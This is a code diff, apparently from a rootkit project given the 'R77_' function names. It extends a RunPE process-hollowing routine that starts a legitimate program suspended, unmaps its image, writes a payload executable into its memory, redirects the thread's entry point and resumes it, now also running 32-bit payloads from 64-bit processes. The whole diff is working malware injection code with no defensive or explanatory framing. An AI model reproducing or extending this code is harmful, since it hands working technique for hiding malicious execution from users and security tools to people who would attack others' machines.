@@ -697,26 +697,38 @@ BOOL IsExecutable64Bit(LPBYTE image, LPBOOL is64Bit)
 }
 BOOL RunPE(LPCWSTR path, LPBYTE payload)
 {
+	BOOL isPayload64Bit;
+	if (IsExecutable64Bit(payload, &isPayload64Bit))
+	{
+		if (isPayload64Bit && BITNESS(32))
+		{
+			// Cannot inject 64-bit payload from 32-bit process.
+			return FALSE;
+		}
+	}
+	else
+	{
+		return FALSE;
+	}
+
 	// For 32-bit (and 64-bit?) process hollowing, this needs to be attempted several times.
 	// This is a workaround to the well known stability issue of process hollowing.
 	for (DWORD i = 0; i < 5; i++)
 	{
-		DWORD processId = 0;
-		PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload + ((PIMAGE_DOS_HEADER)payload)->e_lfanew);
+		STARTUPINFOW startupInfo;
+		PROCESS_INFORMATION processInformation;
+		i_memset(&startupInfo, 0, sizeof(STARTUPINFOW));
+		i_memset(&processInformation, 0, sizeof(PROCESS_INFORMATION));
+		startupInfo.cb = sizeof(startupInfo);
 
-		if (ntHeaders->Signature == IMAGE_NT_SIGNATURE)
+		if (CreateProcessW(path, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startupInfo, &processInformation))
 		{
-			STARTUPINFOW startupInfo;
-			PROCESS_INFORMATION processInformation;
-			i_memset(&startupInfo, 0, sizeof(STARTUPINFOW));
-			i_memset(&processInformation, 0, sizeof(PROCESS_INFORMATION));
-			startupInfo.cb = sizeof(startupInfo);
-
-			if (CreateProcessW(path, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startupInfo, &processInformation))
+			if (isPayload64Bit == BITNESS(64))
 			{
-				processId = processInformation.dwProcessId;
+				// Payload bitness matches current process bitness
 
-				//TODO: NtUnmapViewOfSection here
+				PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload + ((PIMAGE_DOS_HEADER)payload)->e_lfanew);
+				R77_NtUnmapViewOfSection(processInformation.hProcess, ntHeaders->OptionalHeader.ImageBase);
 
 				LPVOID imageBase = VirtualAllocEx(processInformation.hProcess, (LPVOID)ntHeaders->OptionalHeader.ImageBase, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 				if (imageBase && WriteProcessMemory(processInformation.hProcess, imageBase, payload, ntHeaders->OptionalHeader.SizeOfHeaders, NULL))
@@ -744,7 +756,7 @@ BOOL RunPE(LPCWSTR path, LPBYTE payload)
 							if (GetThreadContext(processInformation.hThread, context))
 							{
 #ifdef _WIN64
-								if (WriteProcessMemory(processInformation.hProcess, (LPVOID)(context->Rdx + sizeof(LPVOID) * 2), &ntHeaders->OptionalHeader.ImageBase, sizeof(LPVOID), NULL))
+								if (WriteProcessMemory(processInformation.hProcess, (LPVOID)(context->Rdx + 16), &ntHeaders->OptionalHeader.ImageBase, 8, NULL))
 								{
 									context->Rcx = (DWORD64)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
 									if (SetThreadContext(processInformation.hThread, context) &&
@@ -754,7 +766,7 @@ BOOL RunPE(LPCWSTR path, LPBYTE payload)
 									}
 								}
 #else
-								if (WriteProcessMemory(processInformation.hProcess, (LPVOID)(context->Ebx + sizeof(LPVOID) * 2), &ntHeaders->OptionalHeader.ImageBase, sizeof(LPVOID), NULL))
+								if (WriteProcessMemory(processInformation.hProcess, (LPVOID)(context->Ebx + 8), &ntHeaders->OptionalHeader.ImageBase, 4, NULL))
 								{
 									context->Eax = (DWORD)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
 									if (SetThreadContext(processInformation.hThread, context) &&
@@ -769,11 +781,63 @@ BOOL RunPE(LPCWSTR path, LPBYTE payload)
 					}
 				}
 			}
+			else
+			{
+				// Spawn 32-bit process from this 64-bit process.
+
+				if (!IsAtLeastWindows10())
+				{
+					//TODO: Custom implementation for Wow64GetThreadContext and Wow64SetThreadContext required to work on Windows 7.
+					return FALSE;
+				}
+
+				PIMAGE_NT_HEADERS32 ntHeaders = (PIMAGE_NT_HEADERS32)(payload + ((PIMAGE_DOS_HEADER)payload)->e_lfanew);
+				R77_NtUnmapViewOfSection(processInformation.hProcess, ntHeaders->OptionalHeader.ImageBase);
+
+				LPVOID imageBase = VirtualAllocEx(processInformation.hProcess, (LPVOID)ntHeaders->OptionalHeader.ImageBase, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+				if (imageBase && WriteProcessMemory(processInformation.hProcess, imageBase, payload, ntHeaders->OptionalHeader.SizeOfHeaders, NULL))
+				{
+					BOOL sectionsWritten = TRUE;
+
+					for (int j = 0; j < ntHeaders->FileHeader.NumberOfSections; j++)
+					{
+						PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(ntHeaders) + j * (ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER);
+
+						if (!WriteProcessMemory(processInformation.hProcess, (LPBYTE)imageBase + sectionHeader->VirtualAddress, (LPBYTE)payload + sectionHeader->PointerToRawData, sectionHeader->SizeOfRawData, NULL))
+						{
+							sectionsWritten = FALSE;
+							break;
+						}
+					}
+
+					if (sectionsWritten)
+					{
+						PWOW64_CONTEXT context = (PWOW64_CONTEXT)VirtualAlloc(NULL, sizeof(WOW64_CONTEXT), MEM_COMMIT, PAGE_READWRITE);
+						if (context)
+						{
+							context->ContextFlags = WOW64_CONTEXT_FULL;
+
+							if (Wow64GetThreadContext(processInformation.hThread, context))
+							{
+								if (WriteProcessMemory(processInformation.hProcess, (LPVOID)(context->Ebx + 8), &ntHeaders->OptionalHeader.ImageBase, 4, NULL))
+								{
+									context->Eax = (DWORD)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
+									if (Wow64SetThreadContext(processInformation.hThread, context) &&
+										ResumeThread(processInformation.hThread) != -1)
+									{
+										return TRUE;
+									}
+								}
+							}
+						}
+					}
+				}
+			}
 		}
 
-		if (processId != 0)
+		if (processInformation.dwProcessId != 0)
 		{
-			HANDLE process = OpenProcess(PROCESS_TERMINATE, FALSE, processId);
+			HANDLE process = OpenProcess(PROCESS_TERMINATE, FALSE, processInformation.dwProcessId);
 			if (process)
 			{
 				TerminateProcess(process, 0);
@@ -913,6 +977,10 @@ NTSTATUS NTAPI R77_NtCreateThreadEx(PHANDLE thread, ACCESS_MASK desiredAccess, L
 	// Use NtCreateThreadEx instead of CreateRemoteThread.
 	// CreateRemoteThread does not work across sessions in Windows 7.
 	return ((NT_NTCREATETHREADEX)GetFunction("ntdll.dll", "NtCreateThreadEx"))(thread, desiredAccess, objectAttributes, processHandle, startAddress, parameter, flags, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, bytesBuffer);
+}
+NTSTATUS NTAPI R77_NtUnmapViewOfSection(HANDLE processHandle, LPVOID baseAddress)
+{
+	return ((NT_NTUNMAPVIEWOFSECTION)GetFunction("ntdll.dll", "NtUnmapViewOfSection"))(processHandle, baseAddress);
 }
 NTSTATUS NTAPI R77_RtlGetVersion(PRTL_OSVERSIONINFOW versionInformation)
 {
